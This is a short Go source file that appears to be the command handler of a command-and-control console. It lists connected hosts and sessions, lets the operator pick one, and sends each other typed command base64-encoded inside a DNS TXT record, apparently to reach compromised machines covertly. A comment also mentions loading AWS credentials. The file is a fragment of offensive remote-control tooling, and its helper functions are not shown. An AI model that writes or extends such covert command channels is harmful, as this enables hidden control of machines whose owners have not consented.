package completion

import (
	"fmt"
	"io/ioutil"
	"math/rand"
	"os"
	"strings"
	"time"
)

func Commands(line string) {
	switch {

	//Load aws profile from .aws/credentials
	case strings.HasPrefix(line, "use"):
		help := HelpText("sessions", "List active sessions.", "enabled")
		parse := ParseCMD(line, 2, help)
		if parse != nil {
			csessionID = parse[1]
		}

	//Show command history
	case line == "history":
		dat, err := ioutil.ReadFile("/tmp/readline.tmp")
		if err != nil {
			break
		}
		fmt.Print(string(dat))

	//Show current sessions
	case line == "sessions":
		for _, h := range connectedHosts {
			fmt.Println(h)
		}

	//exit
	case line == "quit":
		connected = false

	//Default if no case
	default:
		cmdString := line
		//if connected == false {
		//	fmt.Println("You are not connected to a profile.")
		//}
		if cmdString == "exit" {
			os.Exit(1)
		}
		rand.Seed(time.Now().UnixNano())

		test := Base64Encode(cmdString) + ":" + RandSeq(10)
		AddTXTRecord(test)

	}
}
